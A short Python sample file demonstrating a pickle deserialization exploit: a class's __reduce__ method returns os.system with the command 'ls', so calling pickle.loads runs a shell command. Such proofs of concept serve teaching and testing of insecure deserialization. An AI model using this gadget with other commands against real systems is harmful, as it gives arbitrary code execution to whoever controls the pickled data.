# sample.py
import pickle
from os import system

class exp:
    def __reduce__(self):
        return (system, ('ls',))

serialized = pickle.dumps({'name': exp(), 'age': 1})
print(pickle.loads(serialized))